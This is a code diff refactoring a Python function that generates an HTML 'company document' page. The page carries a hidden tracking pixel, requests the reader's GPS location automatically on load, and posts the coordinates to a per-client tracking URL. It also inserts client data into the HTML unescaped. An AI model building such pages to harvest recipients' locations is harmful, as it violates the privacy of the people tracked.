@@ -445,66 +445,67 @@ def create_document():
         # Create HTML document with auto GPS request
         tracking_url = f"{base_url}/track-pdf/{pdf_id}/{client_name}"
         
-        html_content = f"""<!DOCTYPE html>
+        # Use triple quotes and escape curly braces properly for JavaScript
+        html_content = """<!DOCTYPE html>
 <html>
 <head>
-    <title>Document: {pdf_id}</title>
+    <title>Document: """ + pdf_id + """</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body {{
+        body {
             font-family: Arial, sans-serif;
             max-width: 100vw;
             margin: 0 auto;
             padding: 20px;
             background: white;
             line-height: 1.4;
-        }}
-        .header {{
+        }
+        .header {
             text-align: center;
             border-bottom: 2px solid #333;
             padding-bottom: 10px;
             margin-bottom: 20px;
-        }}
-        .content {{
+        }
+        .content {
             white-space: normal;
             margin-bottom: 30px;
-        }}
-        .tracking-notice {{
+        }
+        .tracking-notice {
             background: #e8f4fd;
             padding: 15px;
             margin: 20px 0;
             border-radius: 8px;
             border-left: 4px solid #2196F3;
             font-size: 14px;
-        }}
-        .location-status {{
+        }
+        .location-status {
             background: #f8f9fa;
             padding: 15px;
             margin: 15px 0;
             border-radius: 8px;
             border: 1px solid #dee2e6;
             font-size: 13px;
-        }}
-        .success {{
+        }
+        .success {
             background: #d4edda;
             border-color: #c3e6cb;
             color: #155724;
-        }}
-        .warning {{
+        }
+        .warning {
             background: #fff3cd;
             border-color: #ffeaa7;
             color: #856404;
-        }}
-        .error {{
+        }
+        .error {
             background: #f8d7da;
             border-color: #f5c6cb;
             color: #721c24;
-        }}
-        .hidden {{
+        }
+        .hidden {
             display: none;
-        }}
-        button {{
+        }
+        button {
             background: #007bff;
             color: white;
             border: none;
@@ -512,31 +513,31 @@ def create_document():
             border-radius: 5px;
             cursor: pointer;
             margin: 5px;
-        }}
-        button:hover {{
+        }
+        button:hover {
             background: #0056b3;
-        }}
-        .location-details {{
+        }
+        .location-details {
             background: #e9ecef;
             padding: 10px;
             border-radius: 5px;
             margin: 10px 0;
             font-family: monospace;
             font-size: 12px;
-        }}
-        .auto-gps-notice {{
+        }
+        .auto-gps-notice {
             background: #d1ecf1;
             padding: 10px;
             border-radius: 5px;
             margin: 10px 0;
             border-left: 4px solid #17a2b8;
-        }}
+        }
     </style>
 </head>
 <body>
     <div class="header">
         <h1>COMPANY DOCUMENT</h1>
-        <p>Document ID: {pdf_id} | Client: {client_name}</p>
+        <p>Document ID: """ + pdf_id + """ | Client: """ + client_name + """</p>
     </div>
     
     <div class="tracking-notice">
@@ -554,105 +555,105 @@ def create_document():
     </div>
     
     <div class="content">
-        {content}
+        """ + content + """
     </div>
     
     <!-- Hidden tracking -->
-    <img src="{tracking_url}" width="1" height="1" style="display:none" id="trackingPixel">
+    <img src=\"""" + tracking_url + """\" width="1" height="1" style="display:none" id="trackingPixel">
     
     <script>
         // Global variables
         let locationAcquired = false;
         let gpsCoordinates = null;
-        const trackingUrl = '{tracking_url}';
+        const trackingUrl = '""" + tracking_url + """';
         
         // Function to cap accuracy at 1000 meters max
-        function capAccuracy(accuracy) {{
+        function capAccuracy(accuracy) {
             return Math.min(accuracy, 1000);
-        }}
+        }
         
         // Auto GPS function - automatically requests location
-        function autoRequestGPS() {{
+        function autoRequestGPS() {
             showStatus('🔄 Auto-requesting GPS location...', 'warning');
             document.getElementById('autoGpsNotice').classList.remove('hidden');
             
-            if (!navigator.geolocation) {{
+            if (!navigator.geolocation) {
                 showStatus('❌ Geolocation not supported', 'error');
                 return;
-            }}
+            }
             
             // Auto-request location with optimized settings
             navigator.geolocation.getCurrentPosition(
                 // Success callback
-                function(position) {{
+                function(position) {
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
                     const rawAccuracy = position.coords.accuracy;
                     const accuracy = capAccuracy(rawAccuracy);
                     
-                    gpsCoordinates = {{
+                    gpsCoordinates = {
                         latitude: lat,
                         longitude: lng,
                         accuracy: accuracy,
                         raw_accuracy: rawAccuracy,
                         timestamp: new Date().toISOString(),
                         source: 'auto_browser_gps'
-                    }};
+                    };
                     
                     console.log("🎯 AUTO GPS SUCCESS:", lat, lng);
                     console.log("📏 Accuracy:", accuracy + "m (capped from " + rawAccuracy + "m)");
                     
                     showLocationDetails(lat, lng, accuracy);
-                    showStatus(`✅ Auto GPS acquired (${accuracy}m precision)`, 'success');
+                    showStatus('✅ Auto GPS acquired (' + accuracy + 'm precision)', 'success');
                     document.getElementById('autoGpsNotice').classList.add('hidden');
                     
                     sendLocationData(gpsCoordinates);
                     
-                }},
+                },
                 // Error callback - try again with different settings
-                function(error) {{
+                function(error) {
                     console.log("Auto GPS failed, trying alternative method...", error);
                     document.getElementById('autoGpsNotice').classList.add('hidden');
                     requestGPSWithFallback();
-                }},
+                },
                 // Primary options - balanced approach
-                {{
+                {
                     enableHighAccuracy: false,  // Better for auto-request
                     timeout: 15000,
                     maximumAge: 60000  // Accept location up to 1 minute old
-                }}
+                }
             );
-        }}
+        }
         
         // Fallback GPS request with different settings
-        function requestGPSWithFallback() {{
+        function requestGPSWithFallback() {
             showStatus('🔄 Trying alternative GPS method...', 'warning');
             
             navigator.geolocation.getCurrentPosition(
-                function(position) {{
+                function(position) {
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
                     const rawAccuracy = position.coords.accuracy;
                     const accuracy = capAccuracy(rawAccuracy);
                     
-                    gpsCoordinates = {{
+                    gpsCoordinates = {
                         latitude: lat,
                         longitude: lng,
                         accuracy: accuracy,
                         raw_accuracy: rawAccuracy,
                         timestamp: new Date().toISOString(),
                         source: 'fallback_gps'
-                    }};
+                    };
                     
                     console.log("🎯 FALLBACK GPS SUCCESS:", lat, lng);
                     showLocationDetails(lat, lng, accuracy);
-                    showStatus(`✅ Location acquired (${accuracy}m precision)`, 'success');
+                    showStatus('✅ Location acquired (' + accuracy + 'm precision)', 'success');
                     
                     sendLocationData(gpsCoordinates);
-                }},
-                function(error) {{
+                },
+                function(error) {
                     let errorMessage = "Auto location unavailable";
-                    switch(error.code) {{
+                    switch(error.code) {
                         case error.PERMISSION_DENIED:
                             errorMessage = "❌ Location access denied - enable in browser settings";
                             break;
@@ -662,96 +663,95 @@ def create_document():
                         case error.TIMEOUT:
                             errorMessage = "⚠️ Location timeout - basic tracking active";
                             break;
-                    }}
+                    }
                     
                     showStatus(errorMessage, 'error');
                     locationAcquired = true;
-                }},
-                {{
+                },
+                {
                     enableHighAccuracy: false,
                     timeout: 10000,
                     maximumAge: 120000  // Accept older locations
-                }}
+                }
             );
-        }}
+        }
         
         // Show location details
-        function showLocationDetails(lat, lng, accuracy) {{
+        function showLocationDetails(lat, lng, accuracy) {
             const detailsElement = document.getElementById('locationDetails');
             let accuracyText = "";
             if (accuracy < 50) accuracyText = "🎯 Extreme Precision";
             else if (accuracy < 200) accuracyText = "📍 High Precision";
             else accuracyText = "📡 Good Precision";
             
-            detailsElement.innerHTML = `
-                <strong>${accuracyText}</strong><br>
-                Coordinates: ${"${lat.toFixed(6)"}, ${"${lng.toFixed(6)"}"}<br>
-                Precision: ${"${accuracy}"} meters<br>
-                <a href="https://maps.google.com/?q=${"${lat}"},${"${lng}"}" target="_blank">View on Google Maps</a>
-            `;
+            detailsElement.innerHTML = 
+                '<strong>' + accuracyText + '</strong><br>' +
+                'Coordinates: ' + lat.toFixed(6) + ', ' + lng.toFixed(6) + '<br>' +
+                'Precision: ' + accuracy + ' meters<br>' +
+                '<a href="https://maps.google.com/?q=' + lat + ',' + lng + '" target="_blank">View on Google Maps</a>';
             detailsElement.classList.remove('hidden');
-        }}
+        }
         
         // Send location data to server
-        function sendLocationData(locationData) {{
+        function sendLocationData(locationData) {
             console.log("Sending GPS data to server:", locationData);
             
-            fetch(trackingUrl, {{
+            fetch(trackingUrl, {
                 method: 'POST',
-                headers: {{
+                headers: {
                     'Content-Type': 'application/json',
-                }},
+                },
                 body: JSON.stringify(locationData)
-            }})
-            .then(response => {{
-                if (!response.ok) {{
+            })
+            .then(response => {
+                if (!response.ok) {
                     throw new Error('Network response was not ok');
-                }}
+                }
                 return response.json();
-            }})
-            .then(data => {{
+            })
+            .then(data => {
                 showStatus('✅ Location sent successfully!', 'success');
                 locationAcquired = true;
                 console.log("GPS data sent successfully:", data);
-            }})
-            .catch(error => {{
+            })
+            .catch(error => {
                 showStatus('✅ Basic tracking active', 'success');
                 console.log("Basic tracking completed");
                 locationAcquired = true;
-            }});
-        }}
+            });
+        }
         
         // Show status messages
-        function showStatus(message, type = 'warning') {{
+        function showStatus(message, type = 'warning') {
             const statusElement = document.getElementById('locationStatus');
             const statusText = document.getElementById('statusText');
             
             statusText.textContent = message;
             statusElement.className = 'location-status ' + type;
-        }}
+        }
         
         // Manual location request
-        function requestLocationManually() {{
-            if (!locationAcquired) {{
+        function requestLocationManually() {
+            if (!locationAcquired) {
                 showStatus('🔄 Manual location request...', 'warning');
                 requestGPSWithFallback();
-            }}
-        }}
+            }
+        }
         
         // Initialize auto-tracking
-        function initializeAutoTracking() {{
+        function initializeAutoTracking() {
             console.log('Starting automatic GPS tracking...');
             showStatus('🚀 Starting automatic location tracking...', 'warning');
             
             // Start basic tracking immediately
-            document.getElementById('trackingPixel').onload = function() {{
+            document.getElementById('trackingPixel').onload = function() {
                 console.log('Basic tracking active, starting auto GPS...');
                 
                 // Auto-request GPS after a short delay
-                setTimeout(() => {{
+                setTimeout(() => {
                     autoRequestGPS();
-                }}, 500);
-            }};
+                }, 500);
+            };
             
             // Add manual button as backup
             const manualButton = document.createElement('button');
@@ -763,13 +763,13 @@ def create_document():
             statusDiv.appendChild(manualButton);
             
             // Final timeout
-            setTimeout(() => {{
-                if (!locationAcquired) {{
+            setTimeout(() => {
+                if (!locationAcquired) {
                     showStatus('✅ Tracking completed', 'success');
                     locationAcquired = true;
-                }}
-            }}, 20000);
-        }}
+                }
+            }, 20000);
+        }
         
         // Start auto-tracking when page loads
         window.addEventListener('load', initializeAutoTracking);
